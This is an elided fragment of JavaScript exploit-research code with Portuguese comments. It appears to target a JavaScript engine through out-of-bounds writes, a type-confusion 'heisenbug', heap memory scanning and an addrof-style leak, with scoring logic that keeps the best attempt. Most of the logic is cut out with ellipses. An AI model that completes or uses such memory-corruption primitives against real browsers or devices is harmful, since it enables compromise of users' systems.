...
import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // Agora usa o s3_utils.mjs corrigido
...
const SCAN_HEAP_END_ADDRESS_R32 = new AdvancedInt64(0x0, 0x8A020000); 
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R32() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
            ...
            if (heisenbugConfirmedThisIter) { 
                try {
                    ...
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R32.low(), SCAN_HEAP_START_ADDRESS_R32.high()); 
                        ...
                        if (current_scan_addr.low() % (SCAN_STEP_R32 * 20) === 0) {logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');}
                        try { 
                            ...
                            if (current_scan_addr.low() % (SCAN_STEP_R32 * 50) === 0) { 
        ...
        // Lógica para best_result_for_runner (R32)
        let tc_ok_this_iter = heisenbugConfirmedThisIter;
        let scan_successful_this_iter = iter_memory_scan_result.success;
        
        let prev_best_score = 0;
        if (best_result_for_runner.memory_scan_result?.success) prev_best_score = 2;
        else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) prev_best_score = 1;

        let current_score = 0; 
        if (scan_successful_this_iter) current_score = 2; 
        else if (tc_ok_this_iter) current_score = 1;
        
        if (current_score > prev_best_score || (current_score === prev_best_score && current_score > 0 && !best_result_for_runner.oob_value_used)) {
